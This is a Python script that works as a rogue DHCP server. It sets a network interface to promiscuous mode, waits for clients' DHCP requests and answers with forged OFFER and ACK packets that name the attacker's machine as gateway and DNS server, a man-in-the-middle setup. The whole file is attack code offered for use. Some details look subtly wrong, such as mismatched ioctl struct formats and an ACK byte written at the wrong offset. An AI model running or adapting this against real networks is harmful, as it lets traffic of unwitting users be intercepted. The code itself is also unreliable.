import socket
import struct
import fcntl
import os

# Constants
READ_BUFFSIZE = 1518
SEND_BUFFSIZE = 1024
ETHER_TYPE_IPv4 = 0x0800
DHCP_OFFER = 2
DHCP_ACK = 5

# Buffers
read_buffer = bytearray(READ_BUFFSIZE)
write_buffer = bytearray(SEND_BUFFSIZE)

# Sockets and interface information
read_sockfd = None
mac_address = None
ip_address = None
idx_local = None
ip_int = None
ip_str = None


def in_cksum(addr):
    sum = 0
    count = len(addr)
    i = 0

    while count > 1:
        sum += (addr[i] << 8) + addr[i + 1]
        count -= 2
        i += 2

    if count > 0:
        sum += addr[i]

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum += sum >> 16
    answer = ~sum & 0xFFFF

    return answer


def setup(interface_name):
    global read_sockfd, mac_address, ip_address, idx_local, ip_int, ip_str

    read_sockfd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))

    # Set interface to promiscuous mode
    ifr = struct.pack("16sH", interface_name.encode(), 0)
    fcntl.ioctl(read_sockfd, 0x8933, ifr)  # SIOCGIFINDEX
    ifr = fcntl.ioctl(read_sockfd, 0x8933, ifr)  # SIOCGIFINDEX
    idx_local = struct.unpack("16sI", ifr)[1]

    ifr = struct.pack("16sH", interface_name.encode(), 0)
    ifr = fcntl.ioctl(read_sockfd, 0x8913, ifr)  # SIOCGIFFLAGS
    flags = struct.unpack("16sH", ifr)[1]
    flags |= 0x100  # IFF_PROMISC
    ifr = struct.pack("16sH", interface_name.encode(), flags)
    fcntl.ioctl(read_sockfd, 0x8914, ifr)  # SIOCSIFFLAGS

    # Read MAC address
    ifr = struct.pack("16sH", interface_name.encode(), 0)
    ifr = fcntl.ioctl(read_sockfd, 0x8927, ifr)  # SIOCGIFHWADDR
    mac_address = ifr[18:24]

    # Read and convert our IP to int and char[]
    ifr = struct.pack("16sH", interface_name.encode(), 0)
    ifr = fcntl.ioctl(read_sockfd, 0x8915, ifr)  # SIOCGIFADDR
    ip_address = ifr[20:24]
    ip_int = struct.unpack("!I", ip_address)[0]
    ip_str = socket.inet_ntoa(ip_address)


def sniff():
    global read_buffer

    while True:
        read_buffer = read_sockfd.recv(READ_BUFFSIZE)

        r_eh = read_buffer[0:14]
        ether_type = struct.unpack("!H", r_eh[12:14])[0]

        if ether_type == ETHER_TYPE_IPv4:
            r_iphdr = read_buffer[14:34]
            protocol = struct.unpack("B", r_iphdr[9:10])[0]

            if protocol == 17:  # Check if it's UDP protocol
                r_udp_header = read_buffer[34:42]
                port_dest = struct.unpack("!H", r_udp_header[2:4])[0]

                if port_dest == 67:
                    print("Read a DHCP discover or request.")
                    return


def build_dhcp_offer(dst_addr):
    global write_buffer

    print("Gonna build a DHCP offer!")
    write_buffer = bytearray(SEND_BUFFSIZE)

    # Fill ethernet header
    w_eh = struct.pack("!6s6sH", mac_address, read_buffer[6:12], ETHER_TYPE_IPv4)
    write_buffer[0:14] = w_eh

    # Fill ip header
    w_iphdr = struct.pack(
        "!BBHHHBBHII",
        0x45,
        0,
        336,
        0,
        0,
        16,
        17,
        0,
        ip_int,
        struct.unpack("!I", socket.inet_aton(dst_addr))[0],
    )
    w_iphdr = bytearray(w_iphdr)
    w_iphdr[10:12] = struct.pack("!H", in_cksum(w_iphdr))
    write_buffer[14:34] = w_iphdr

    # Fill udp header
    w_udp_header = struct.pack("!HHHH", 67, 68, 0x13C, 0)
    write_buffer[34:42] = w_udp_header

    # Fill dhcp header
    w_dhcp_header = struct.pack(
        "!BBBBIHHIIII16s192s4s",
        2,
        1,
        6,
        0,
        struct.unpack("!I", read_buffer[42:46])[0],
        0,
        0,
        0,
        struct.unpack("!I", socket.inet_aton(dst_addr))[0],
        0,
        struct.unpack("!I", socket.inet_aton(ip_str))[0],
        b"".join([read_buffer[i : i + 1] for i in range(6, 12)]),
        b"\x00" * 192,
        b"\x63\x82\x53\x63",
    )
    write_buffer[42:282] = w_dhcp_header

    options = [
        (53, 1, DHCP_OFFER),
        (54, 4, ip_int),
        (1, 4, 0xFFFFFF00),
        (51, 4, 0x0001A800),
        (3, 4, ip_int),
        (6, 4, ip_int),
        (28, 4, 0xFFFFFFFF),
        (255, 0, 0),
    ]
    offset = 282
    for option in options:
        write_buffer[offset] = option[0]
        write_buffer[offset + 1] = option[1]
        if option[1] == 4:
            write_buffer[offset + 2 : offset + 6] = struct.pack("!I", option[2])
        else:
            write_buffer[offset + 2] = option[2]
        offset += 2 + option[1]


def send_write_buffer():
    to = struct.pack("!HHi6s", idx_local, 0, 6, read_buffer[6:12])
    send_sockfd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    send_sockfd.sendto(write_buffer[:SEND_BUFFSIZE], to)
    send_sockfd.close()


def build_dhcp_ack():
    global write_buffer

    print("Gonna build a DHCP ack!")
    write_buffer[288] = DHCP_ACK


def main():
    import sys

    if len(sys.argv) < 2:
        print("./main <interface_name> [<ip_for_spoof>]")
        return 1

    interface_name = sys.argv[1]
    ip_for_spoof = sys.argv[2] if len(sys.argv) > 2 else "255.255.255.255"

    setup(interface_name)
    sniff()
    build_dhcp_offer(ip_for_spoof)
    send_write_buffer()
    sniff()
    build_dhcp_ack()
    send_write_buffer()


if __name__ == "__main__":
    main()
